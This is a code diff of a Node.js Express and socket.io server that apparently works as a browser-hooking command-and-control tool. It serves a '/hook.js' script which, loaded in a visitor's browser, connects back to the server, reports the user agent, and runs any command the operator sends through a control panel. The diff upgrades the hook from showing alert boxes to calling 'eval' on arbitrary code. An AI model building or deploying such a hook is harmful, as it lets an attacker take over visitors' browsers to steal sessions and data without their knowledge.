@@ -1,74 +1,82 @@
 const express = require('express');
 const http = require('http');
-const socketIo = require('socket.io');
-const bodyParser = require('body-parser');
-const cors = require('cors');
+const { Server } = require('socket.io');
+const path = require('path');
 
+// Initialize Express and HTTP Server
 const app = express();
 const server = http.createServer(app);
-const io = socketIo(server);
 
-// Middleware
-app.use(bodyParser.json());
-app.use(cors());
-app.set('view engine', 'ejs');
-app.use(express.static('public'));
+// Initialize WebSocket server
+const io = new Server(server);
 
-// In-memory data store for hooked clients
-let clients = {};
+// Serve static files for the control panel
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Body parser middleware
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// Clients storage
+const clients = {};
 
 // Serve the control panel
-app.get('/', (req, res) => {
-    res.render('index', { clients });
+app.get('/control-panel', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'control-panel.html'));
 });
 
-// Serve the hook script
+// Hook URL
 app.get('/hook.js', (req, res) => {
-    res.type('application/javascript');
-    res.send(`
-        const socket = io('${req.protocol}://${req.get('host')}');
-        socket.emit('hooked', {
-            userAgent: navigator.userAgent,
-            url: window.location.href
-        });
-
-        // Example: Execute commands from server
-        socket.on('command', (cmd) => {
-            if (cmd.type === 'alert') {
-                alert(cmd.message);
-            }
-        });
-    `);
+  res.setHeader('Content-Type', 'application/javascript');
+  res.send(`
+    const socket = io('${req.protocol}://${req.hostname}:${process.env.PORT || 3000}');
+    socket.emit('client-connection', { userAgent: navigator.userAgent });
+    socket.on('command', (cmd) => {
+      eval(cmd); // Execute the command from the control panel
+    });
+  `);
 });
 
-// Socket.io handlers
+// WebSocket connection handler
 io.on('connection', (socket) => {
-    console.log(`Client connected: ${socket.id}`);
+  console.log(`New client connected: ${socket.id}`);
 
-    socket.on('hooked', (data) => {
-        clients[socket.id] = {
-            id: socket.id,
-            ...data
-        };
-        io.emit('updateClients', clients); // Update control panel
-        console.log('New client hooked:', data);
-    });
+  // Register new client
+  socket.on('client-connection', (data) => {
+    clients[socket.id] = { userAgent: data.userAgent };
+    io.emit('update-clients', clients); // Update control panel
+  });
 
-    socket.on('sendCommand', ({ clientId, command }) => {
-        io.to(clientId).emit('command', command);
-    });
+  // Handle commands from the control panel
+  socket.on('send-command', ({ id, command }) => {
+    io.to(id).emit('command', command);
+  });
 
-    socket.on('disconnect', () => {
-        delete clients[socket.id];
-        io.emit('updateClients', clients); // Update control panel
-        console.log(`Client disconnected: ${socket.id}`);
-    });
+  // Disconnect handler
+  socket.on('disconnect', () => {
+    console.log(`Client disconnected: ${socket.id}`);
+    delete clients[socket.id];
+    io.emit('update-clients', clients); // Update control panel
+  });
 });
 
 // Start the server
-const LOCAL_IP = '10.0.1.33'; // Replace with your actual local IP
-const PORT = 3000;
-
+const PORT = process.env.PORT || 3000;
+const LOCAL_IP = '0.0.0.0'; // Bind to all local network interfaces
 server.listen(PORT, LOCAL_IP, () => {
-    console.log(`Server running at http://${LOCAL_IP}:${PORT}`);
+  console.log(`Server running at http://${getLocalIPAddress()}:${PORT}`);
 });
+
+// Utility to get local IP address
+function getLocalIPAddress() {
+  const os = require('os');
+  const interfaces = os.networkInterfaces();
+  for (const interfaceName in interfaces) {
+    for (const iface of interfaces[interfaceName]) {
+      if (iface.family === 'IPv4' && !iface.internal) {
+        return iface.address;
+      }
+    }
+  }
+  return 'localhost';
+}
